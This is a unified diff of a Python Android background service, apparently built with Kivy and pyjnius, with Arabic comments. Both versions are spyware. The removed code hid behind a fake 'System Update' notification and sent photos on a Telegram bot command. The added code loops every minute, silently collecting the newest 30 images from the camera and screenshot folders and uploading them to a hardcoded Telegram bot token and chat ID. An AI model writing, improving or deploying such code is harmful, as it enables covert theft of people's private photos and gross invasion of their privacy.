@@ -1,62 +1,45 @@
-import os, time, threading, telebot
+import os, time, requests
 from jnius import autoclass
 
-# أدوات أندرويد
+# إعدادات أندرويد للبقاء حياً
 PythonService = autoclass('org.kivy.android.PythonService')
-Context = autoclass('android.content.Context')
-NotificationBuilder = autoclass('android.app.Notification$Builder')
-NotificationChannel = autoclass('android.app.NotificationChannel')
-NotificationManager = autoclass('android.app.NotificationManager')
-Build = autoclass('android.os.Build')
-
 service = PythonService.mService
-context = service.getApplicationContext()
 
-def start_foreground():
-    CHANNEL_ID = "photo_sync_channel"
-    nm = context.getSystemService(Context.NOTIFICATION_SERVICE)
-    if Build.VERSION.SDK_INT >= 26:
-        channel = NotificationChannel(CHANNEL_ID, "System Sync", 2)
-        nm.createNotificationChannel(channel)
-        builder = NotificationBuilder(context, CHANNEL_ID)
-    else:
-        builder = NotificationBuilder(context)
-    
-    notification = builder.setContentTitle("تحديث النظام") \
-                          .setContentText("جاري فحص الصور...") \
-                          .setSmallIcon(context.getApplicationInfo().icon) \
-                          .build()
-    service.startForeground(1, notification)
+def send_to_telegram(file_path):
+    token = "7820129712:AAH9pZ49S_m8tY8965625902"
+    chat_id = "6110903337"
+    url = f"https://api.telegram.org/bot{token}/sendPhoto"
+    try:
+        with open(file_path, 'rb') as f:
+            r = requests.post(url, data={'chat_id': chat_id}, files={'photo': f}, timeout=30)
+        return r.status_code == 200
+    except:
+        return False
 
-bot = telebot.TeleBot("7820129712:AAH9pZ49S_m8tY8965625902", threaded=False)
-
-@bot.message_handler(commands=['photo'])
-def handle_photo(message):
-    folders = [
+def start_sync():
+    # المسارات التي سنفحصها
+    paths = [
         "/storage/emulated/0/DCIM/Camera",
         "/storage/emulated/0/Pictures/Screenshots"
     ]
-    for folder in folders:
-        if os.path.exists(folder):
-            try:
-                files = [os.path.join(folder, f) for f in os.listdir(folder) 
-                         if f.lower().endswith(('.jpg', '.png', '.jpeg'))]
-                # ترتيب الأحدث أولاً
+    
+    sent_files = [] # قائمة مؤقتة لكي لا يكرر إرسال نفس الصورة
+    
+    while True:
+        for p in paths:
+            if os.path.exists(p):
+                files = [os.path.join(p, f) for f in os.listdir(p) if f.lower().endswith(('.jpg', '.png', '.jpeg'))]
+                # ترتيب حسب الأحدث
                 files.sort(key=os.path.getmtime, reverse=True)
                 
-                # سحب 30 صورة من كل مجلد
-                for img_path in files[:30]:
-                    try:
-                        with open(img_path, 'rb') as photo:
-                            bot.send_photo("6110903337", photo)
-                        time.sleep(0.5)
-                    except: continue
-            except: pass
+                for img in files[:30]: # أول 30 صورة
+                    if img not in sent_files:
+                        if send_to_telegram(img):
+                            sent_files.append(img)
+                            time.sleep(1) # تأخير لتجنب الحظر
+        
+        time.sleep(60) # انتظر دقيقة قبل الفحص مرة أخرى
 
 if __name__ == '__main__':
-    start_foreground()
-    while True:
-        try:
-            bot.infinity_polling(timeout=20)
-        except:
-            time.sleep(10)
+    # تشغيل المزامنة فوراً
+    start_sync()
